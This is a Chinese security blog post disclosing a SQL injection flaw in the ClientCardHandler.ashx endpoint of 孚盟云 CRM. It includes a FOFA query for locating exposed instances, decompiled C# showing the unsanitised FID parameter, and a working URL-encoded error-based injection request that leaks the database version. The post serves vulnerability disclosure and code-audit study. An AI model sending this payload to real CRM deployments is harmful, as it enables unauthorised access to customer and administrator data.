---
title: "孚盟云CRM ClientCardHandler.ashx SQL注入漏洞"
source: https://mrxn.net/jswz/fumacrm-ClientCardHandler-sqli.html
asset_dir: assets/孚盟云crm-clientcardhandler.ashx-sql注入漏洞
---

# 孚盟云CRM ClientCardHandler.ashx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/8/2 11:52
- 844浏览
- [0评论](#comment)
- 14分钟阅读

深入探索

SaaS

数据库

CRM

---

# 漏洞简介

上海孚盟[软件](#)有限公司是一家专业的外贸SaaS服务和行业解决方案提供商。其旗下产品孚盟云ClientCardHandler.ashx接口存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的远程攻击者除了可以利用 SQL注入漏洞获取数据库中的信息(例如，管理员后台密码、站点的用户个人信息)之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

客户关系管理

# 影响版本

# fofa语法

> app="孚盟软件-孚盟云"

# 漏洞分析

直接看 ClientCardHandler.ashx 对应的dll文件 FumaCRM\_BS.NewWeb.dll 里有关 ClientCardHandler 方法的实现如下

```
public void ProcessRequest(HttpContext context)
{
  context.Response.ContentType = "text/plain";
  string str = context.Request["method"].ToString();
  if (!string.op_Equality(str, "SaveContacts"))
  {
    if (!string.op_Equality(str, "LoadCustomersInfo"))
    {
      if (!string.op_Equality(str, "getCardImage"))
        return;
      this.getCardImage(context);
    }
    else
      this.LoadCustomersInfo(context);
  }
  else
    this.SaveContacts(context);
}
```

当 **method=getCardImage** 时，进入`getCardImage`方法

```
public void getCardImage(HttpContext context)
{
  this.WriteLog("进入名片FID信息获取imageurl");
  string str = context.Request["FID"].ToString();
  Hashtable o = new Hashtable();
  try
  {
    DataTable dataSource = new CreatePageDao().GetDataSource($" select Front_jpg,Back_jpg,CustFID,ConStactFID from bfCamCardInfo where FID='{str}' ");
```

未经过滤或参数化绑定的参数 **FID** 被直接拼接进SQL语句中进行执行，造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

其他当 `method=LoadCustomersInfo`、`SaveContacts时`，均存在SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

[![孚盟云CRM ClientCardHandler.ashx SQL注入漏洞](images/img-001-84142cb878d1.webp)](https://image.mrxn.net/99f1cb0b894442d8995b5e1bffd64587.webp)

[![孚盟云CRM ClientCardHandler.ashx SQL注入漏洞](images/img-002-f3b227fb6e95.webp)](https://image.mrxn.net/8ab18d65ba204c45b8d828d6fe387da5.webp)

# 漏洞复现

```
GET /m/Dingding/Ajax/ClientCardHandler.ashx?method=getCardImage&FID=%31%27%61%6e%64%20%31%3c%40%40%76%65%72%73%69%6f%6e%2d%2d HTTP/1.1
Host: fumacrm.mrxn.net
```

[![孚盟云CRM ClientCardHandler.ashx SQL注入漏洞](images/img-003-fccd1c561973.webp)](https://image.mrxn.net/cdbfba031d064ad2bb1162757161a998.webp)

成功通过报错注入在响应回显数据库版本信息

SQL注入检测工具

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
